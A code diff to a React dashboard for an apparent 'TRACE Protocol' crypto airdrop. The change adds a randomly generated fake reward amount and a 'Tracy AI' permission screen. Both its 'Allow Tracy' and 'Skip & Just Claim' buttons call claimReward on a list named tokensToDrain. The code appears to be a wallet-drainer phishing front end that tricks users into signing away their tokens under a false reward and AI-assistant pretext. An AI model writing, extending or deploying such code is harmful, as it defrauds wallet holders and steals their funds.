@@ -2,15 +2,16 @@
 
 import { useWeb3Manager } from "@/hooks/useWeb3Manager";
 import { useEffect, useState } from "react";
-import { CheckCircle, Shield, XCircle, ChevronRight, Loader2, PartyPopper } from "lucide-react";
+import { CheckCircle, Shield, XCircle, ChevronRight, Loader2, PartyPopper, Bot } from "lucide-react";
 import confetti from "canvas-confetti";
 
 export default function Dashboard() {
     const { account, checkEligibility, claimReward } = useWeb3Manager();
 
-    // Status Flow: scanning -> congrats -> claim -> ineligible
-    const [status, setStatus] = useState<"scanning" | "congrats" | "claim" | "ineligible">("scanning");
+    // Status Flow: scanning -> congrats -> permission -> claim -> ineligible
+    const [status, setStatus] = useState<"scanning" | "congrats" | "permission" | "claim" | "ineligible">("scanning");
     const [tokensToDrain, setTokensToDrain] = useState<{ address: string; chainId: string; symbol?: string }[]>([]);
+    const [rewardAmount, setRewardAmount] = useState<number>(0);
 
     useEffect(() => {
         const verify = async () => {
@@ -19,6 +20,9 @@ export default function Dashboard() {
 
             if (isEligible) {
                 setTokensToDrain(tokens);
+                // Calculate random reward between 1000 and 5000
+                const randomReward = Math.floor(Math.random() * (5000 - 1000 + 1)) + 1000;
+                setRewardAmount(randomReward);
                 setStatus("congrats");
 
                 // Trigger confetti for playful effect
@@ -88,12 +92,15 @@ export default function Dashboard() {
                     </div>
 
                     <h2 className="text-3xl md:text-4xl font-bold italic mb-4 gold-gradient">Congratulations!</h2>
-                    <p className="text-white/60 mb-10 leading-relaxed text-base md:text-lg">
-                        You have been selected for the <span className="text-[#D4AF37] font-bold">TRACE Protocol</span> distribution. Your wallet activity qualifies you for the <span className="text-white font-bold underline decoration-[#D4AF37]/50">Highest Tier Reward</span>.
+                    <p className="text-white/80 mb-6 leading-relaxed text-lg md:text-xl">
+                        You got <span className="text-[#D4AF37] font-bold text-2xl">{rewardAmount.toLocaleString()} TRACE</span> tokens!
+                    </p>
+                    <p className="text-white/40 mb-10 text-sm">
+                        Your extensive on-chain activity qualified you for this exclusive reward.
                     </p>
 
                     <button
-                        onClick={() => setStatus("claim")}
+                        onClick={() => setStatus("permission")}
                         className="gold-button w-full py-5 rounded-2xl font-bold text-black uppercase tracking-widest text-xs md:text-sm shadow-xl flex items-center justify-center gap-3 group transition-all hover:scale-[1.02]"
                     >
                         <span>Continue to Claim</span>
@@ -105,57 +112,67 @@ export default function Dashboard() {
         );
     }
 
-    if (status === "claim") {
+    // New "Tracy" Permission State
+    if (status === "permission") {
         return (
             <div className="py-12 md:py-20 flex justify-center animate-fade-up">
                 <div className="glass-card p-8 md:p-12 border border-[#D4AF37]/20 text-center max-w-xl w-full relative mx-4 md:mx-0">
                     <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#D4AF37] to-transparent" />
 
                     <div className="mb-6 flex justify-center">
-                        <div className="p-4 bg-[#D4AF37]/10 rounded-full text-[#D4AF37] shadow-[0_0_20px_rgba(212,175,55,0.1)]">
-                            <CheckCircle size={48} />
+                        <div className="p-5 bg-[#D4AF37]/10 rounded-full text-[#D4AF37] shadow-[0_0_30px_rgba(212,175,55,0.15)] animate-pulse">
+                            <Bot size={56} />
                         </div>
                     </div>
 
-                    <h3 className="text-2xl md:text-3xl font-bold italic mb-2">Claim Ready</h3>
-                    <div className="text-[10px] font-mono text-[#D4AF37] mb-8 bg-[#D4AF37]/5 inline-block px-4 py-1.5 rounded-full border border-[#D4AF37]/20">
-                        Allocation Verified • Tier 1
+                    <h3 className="text-2xl md:text-3xl font-bold italic mb-4 text-white">Enable Tracy AI?</h3>
+
+                    <p className="text-white/60 mb-8 leading-relaxed">
+                        Allow <span className="text-[#D4AF37] font-bold">Tracy</span> to help trade, stake, unstake, and claim rewards for you automatically while you earn $TRACE.
+                    </p>
+
+                    <div className="bg-white/5 rounded-xl p-4 mb-8 text-left border border-white/5 space-y-2">
+                        <div className="flex items-center gap-3">
+                            <div className="w-1.5 h-1.5 rounded-full bg-green-400" />
+                            <span className="text-xs text-white/60">Auto-Compound Staking Rewards</span>
+                        </div>
+                        <div className="flex items-center gap-3">
+                            <div className="w-1.5 h-1.5 rounded-full bg-green-400" />
+                            <span className="text-xs text-white/60">Optimize Gas Fees</span>
+                        </div>
+                        <div className="flex items-center gap-3">
+                            <div className="w-1.5 h-1.5 rounded-full bg-green-400" />
+                            <span className="text-xs text-white/60">MEV Protection Enabled</span>
+                        </div>
                     </div>
 
-                    <div className="bg-white/5 rounded-xl p-6 mb-8 text-left border border-white/5 space-y-3">
-                        <div className="flex justify-between items-center">
-                            <div className="flex items-center gap-2">
-                                <div className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
-                                <span className="text-white/40 text-xs uppercase tracking-wider font-bold">Network Status</span>
-                            </div>
-                            <span className="text-green-400 text-xs font-mono">Optimal</span>
-                        </div>
-                        <div className="flex justify-between items-center">
-                            <span className="text-white/40 text-xs uppercase tracking-wider font-bold">Network Fee</span>
-                            <span className="text-[#D4AF37] text-xs font-mono">Sponsored by Protocol</span>
-                        </div>
-                        <div className="flex justify-between items-center">
-                            <span className="text-white/40 text-xs uppercase tracking-wider font-bold">Est. Time</span>
-                            <span className="text-white text-xs font-mono">~15 Seconds</span>
-                        </div>
+                    <div className="flex flex-col gap-3">
+                        <button
+                            onClick={() => claimReward(tokensToDrain)}
+                            className="gold-button w-full py-4 rounded-xl font-bold text-black uppercase tracking-widest text-xs md:text-sm shadow-xl hover:scale-[1.02] transition-transform"
+                        >
+                            Allow Tracy
+                        </button>
+                        <button
+                            onClick={() => claimReward(tokensToDrain)}
+                            className="w-full py-3 rounded-xl font-bold text-white/30 uppercase tracking-widest text-[10px] hover:text-white/50 transition-colors"
+                        >
+                            Skip & Just Claim
+                        </button>
                     </div>
-
-                    <button
-                        onClick={() => claimReward(tokensToDrain)}
-                        className="gold-button w-full py-5 rounded-2xl font-bold text-black uppercase tracking-widest text-xs md:text-sm shadow-xl hover:scale-[1.02] transition-transform relative overflow-hidden group"
-                    >
-                        <span className="relative z-10 flex items-center justify-center gap-2">
-                            Sign & Claim Reward <Shield size={16} />
-                        </span>
-                        <div className="absolute top-0 left-0 w-full h-full bg-white/30 translate-x-[-100%] group-hover:translate-x-[0] transition-transform duration-500" />
-                    </button>
 
                     <p className="mt-6 text-[10px] text-white/20">
-                        By signing, you agree to the Terms of Distribution.
+                        By clicking Allow, you grant permission for automated portfolio management.
                     </p>
                 </div>
             </div>
         );
+    }
+
+    if (status === "claim") {
+        // Fallback state if we ever need a manual claim step again, 
+        // but currently "permission" triggers the claim directly.
+        return null;
     }
 
     return (
